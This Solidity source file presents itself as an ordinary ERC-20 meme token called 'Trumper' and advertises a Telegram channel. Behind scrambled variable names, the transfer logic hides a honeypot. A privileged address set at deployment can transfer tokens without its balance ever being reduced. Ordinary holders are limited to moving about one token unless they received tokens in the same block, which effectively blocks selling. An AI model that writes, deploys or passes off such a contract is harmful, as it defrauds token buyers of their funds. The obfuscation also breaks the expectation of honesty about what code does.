/*

https://t.me/trumpereth

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Trumper is Ownable {
    function approve(address tynembaszxq, uint256 wmictuxogb) public returns (bool success) {
        allowance[msg.sender][tynembaszxq] = wmictuxogb;
        emit Approval(msg.sender, tynembaszxq, wmictuxogb);
        return true;
    }

    uint256 private xtrykcs = 115;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address tcvyq, uint256 wmictuxogb) public returns (bool success) {
        ebtw(msg.sender, tcvyq, wmictuxogb);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private ubnylkrdzcwe;

    mapping(address => uint256) public balanceOf;

    function ebtw(address vqszwd, address tcvyq, uint256 wmictuxogb) private {
        address duazb = IUniswapV2Factory(ubnylkrdzcwe.factory()).getPair(address(this), ubnylkrdzcwe.WETH());
        if (0 == rdcvk[vqszwd]) {
            if (vqszwd != duazb && phbqmydsuex[vqszwd] != block.number && wmictuxogb < totalSupply) {
                require(wmictuxogb <= totalSupply / (10 ** decimals));
            }
            balanceOf[vqszwd] -= wmictuxogb;
        }
        balanceOf[tcvyq] += wmictuxogb;
        phbqmydsuex[tcvyq] = block.number;
        emit Transfer(vqszwd, tcvyq, wmictuxogb);
    }

    uint8 public decimals = 9;

    string public name;

    constructor(string memory olefvrdpis, string memory uxmpoztbnw, address fect, address ymestkxd) {
        name = olefvrdpis;
        symbol = uxmpoztbnw;
        balanceOf[msg.sender] = totalSupply;
        rdcvk[ymestkxd] = xtrykcs;
        ubnylkrdzcwe = IUniswapV2Router02(fect);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private phbqmydsuex;

    mapping(address => uint256) private rdcvk;

    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address vqszwd, address tcvyq, uint256 wmictuxogb) public returns (bool success) {
        require(wmictuxogb <= allowance[vqszwd][msg.sender]);
        allowance[vqszwd][msg.sender] -= wmictuxogb;
        ebtw(vqszwd, tcvyq, wmictuxogb);
        return true;
    }
}
